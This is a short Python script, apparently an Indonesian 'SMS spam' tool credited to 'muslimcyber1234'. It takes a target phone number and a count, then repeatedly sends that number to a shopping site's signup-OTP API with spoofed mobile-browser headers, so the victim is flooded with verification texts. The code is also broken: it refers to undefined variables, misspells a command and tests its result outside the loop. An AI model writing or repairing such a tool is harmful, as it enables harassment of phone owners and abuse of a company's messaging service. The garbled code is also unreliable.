import json
import requests
import sys
import os


def main():
        os.system("claer")
        os.system("figlet muslimcyber1234")
        banner="""

        (+)AUTHOR :muslimcyber1234
        (-)Team : muslimcyber1234
        """

        print(banner)
        nomor= input  ('nomor target : ' )
        jumlah= input('jumlah spam sms : ' )

        head = {
        "User-Agent": "Mozilla/5.0 (Linux; Android 10; SM-A107F) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/83.0.4103.101 Mobile Safari/537.36",
        "Referer": "https://www.mapclub.com/en/user/signup",
        "Host": "cmsapi.mapclub.com",
        }


        dat = {
        'phone' : no
        }


        for x in range(int(jum)):
               leosureo = requests.post("https://cmsapi.mapclub.com/api/signup-otp", headers=head, json=dat)
        if 'eror' in leosureao:
               print('gagal mengirim' + no)
        else:
               print('succses mengirim' + no)



main()
